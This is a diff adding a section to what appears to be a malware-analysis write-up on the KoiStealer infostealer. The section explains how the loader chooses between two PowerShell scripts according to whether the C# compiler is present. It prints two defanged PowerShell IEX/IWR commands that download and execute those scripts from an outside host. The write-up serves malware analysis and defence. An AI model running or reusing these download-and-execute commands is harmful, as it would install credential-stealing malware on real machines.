@@ -215,9 +215,18 @@ This returns the address 0723e398, navigating to this address in memory gives us
 
 <img width="900" alt="image" src="https://github.com/user-attachments/assets/0e7362d3-7258-4595-a09d-060f025a6041" />
 
+This is the WinDbg element of this post covered, but the main payload to KoiStealer is the followig assmelby which gets downloaded and execution from this function:
 
+<img width="1300" alt="image" src="https://github.com/user-attachments/assets/dcb97fd7-c99c-40e7-ae97-2632a13caa6d" />
 
+The routine determines which payload to retrieve based on the presence of the C# compiler (csc.exe, version v4.0.30319). If the compiler is found, it downloads sd4.ps1; otherwise, it downloads sd2.ps1. Both PowerShell scripts are designed to fetch and execute the KoiStealer malware.
 
+The corresponding PowerShell commands are:
+
+```
+powershell.exe -command IEX(IWR -UseBasicParsing "hxxps[://]casettalecese[.]it/wp-content/uploads/2022/10/sd4.ps1")
+powershell.exe -command IEX(IWR -UseBasicParsing "hxxps[://]casettalecese[.]it/wp-content/uploads/2022/10/sd2.ps1")
+```
 
 
 
